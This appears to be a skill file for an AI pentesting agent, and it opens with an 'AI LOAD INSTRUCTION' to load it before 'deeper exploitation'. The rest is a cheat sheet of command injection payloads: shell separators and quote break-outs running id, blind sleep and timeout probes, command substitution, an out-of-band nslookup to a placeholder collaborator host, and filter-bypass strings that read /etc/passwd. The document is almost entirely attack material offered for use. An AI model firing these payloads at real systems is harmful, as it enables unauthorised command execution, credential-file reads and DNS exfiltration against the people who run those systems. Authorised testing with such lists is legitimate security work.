# SKILL: Command Injection Payload Selection — Operators, Blind Probes, and Filter-Bypass Families

> **AI LOAD INSTRUCTION**: Use this skill when shell execution is plausible and you need compact probes for syntax break-out, blind timing, and out-of-band verification before deeper exploitation.

## 1. WHEN TO LOAD THIS SKILL

Load when input reaches ping, convert, archive, import, backup, DNS, system tool wrappers, or image/document processors.

## 2. FIRST-PASS PAYLOAD FAMILIES

| Context | Start With | Backup |
|---|---|---|
| generic shell separator | `;id` | `&&id` |
| quoted argument | `";id;"` | `';id;'` |
| blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| command substitution | `$(id)` | `` `id` `` |
| out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

## 3. FILTER-BYPASS PICKS

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

## 4. SOURCE POOLS TO CONSULT

- Web-Fuzzing-Box: `Vuln/` command-related payload directories and web dictionaries
- PayloadsAllTheThings: `Command Injection/`

## 5. QUICK CHECKLIST

1. Determine Linux, Windows, or unknown execution context.
2. Use one visible probe and one blind probe.
3. If separators fail, try substitution and whitespace bypass families.
4. Move to the full CMDi skill only after execution style is confirmed.